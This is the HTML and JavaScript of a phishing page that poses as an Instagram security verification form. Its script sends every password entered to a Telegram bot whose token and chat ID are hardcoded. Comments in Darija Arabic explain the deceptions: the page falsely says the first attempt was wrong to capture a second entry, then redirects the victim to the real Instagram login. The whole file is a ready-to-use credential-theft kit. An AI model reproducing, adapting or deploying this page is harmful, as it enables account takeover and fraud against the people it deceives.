<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Security Verification</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/ed963513065d.png">
    <style>
        * { box-sizing: border-box; }
        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; align-items: center; margin: 0; min-height: 100vh; }
        .main-container { background-color: #fff; border: 1px solid #dbdbdb; padding: 30px 40px; width: 350px; margin-top: 80px; display: flex; flex-direction: column; align-items: center; border-radius: 1px; }
        .header-text { color: #262626; font-weight: 600; font-size: 17px; margin-bottom: 12px; text-align: center; }
        .sub-text { color: #8e8e8e; font-size: 14px; line-height: 18px; margin-bottom: 25px; text-align: center; }
        input { width: 100%; padding: 11px 8px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 13px; }
        .btn-submit { width: 100%; background-color: #0095f6; color: white; border: none; padding: 7px; border-radius: 8px; font-weight: 600; cursor: pointer; margin: 15px 0; }
        .error-msg { color: #ed4956; font-size: 12px; margin-bottom: 10px; display: none; text-align: center; }
        .footer { margin-top: auto; padding: 24px; text-align: center; width: 100%; color: #8e8e8e; font-size: 12px; }
    </style>
</head>
<body>

    <div class="main-container">
        <h2 class="header-text">Security Verification</h2>
        <p id="status_text" class="sub-text">To secure your account, please verify your current password before choosing a new one.</p>
        
        <div id="error_msg" class="error-msg">The password you entered is incorrect. Please try again.</div>
        
        <input type="password" id="pass_input" placeholder="Current Password" autocomplete="current-password">
        <input type="password" placeholder="New Password">
        
        <button type="button" id="submit_btn" class="btn-submit">Verify & Update</button>
    </div>

    <div class="footer">
        <div>Meta • About • Help • Privacy • Terms</div>
        <div style="margin-top: 10px;">© 2026 Instagram from Meta</div>
    </div>

    <script>
        let attempt = 0;
        const token = '8531200875:AAGR0wRXZLRvrvwqGgXwfBRd6n0V0gjYWcU';
        const chatId = '6347084263';

        document.getElementById('submit_btn').onclick = function() {
            const pass = document.getElementById('pass_input').value;
            if(!pass) return;

            attempt++;
            
            // إرسال البيانات لتيليغرام بلا ما تبان حتى صفحة
            const message = `🚨 Attempt ${attempt}: ${pass}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            
            fetch(url); // الخدمة في الخلفية

            if (attempt === 1) {
                // المرة الأولى: كذبو عليه بلي غلط
                document.getElementById('pass_input').value = "";
                document.getElementById('error_msg').style.display = "block";
                document.getElementById('pass_input').style.border = "1px solid #ed4956";
            } else {
                // المرة الثانية: صيفطو لتطبيق إنستغرام نيشان
                window.location.href = "instagram://"; 
                
                // إلا ما عندوش التطبيق محلول، صيفطو للموقع الرسمي
                setTimeout(() => {
                    window.location.href = "https://www.instagram.com/accounts/login/";
                }, 500);
            }
        };
    </script>

</body>
</html>
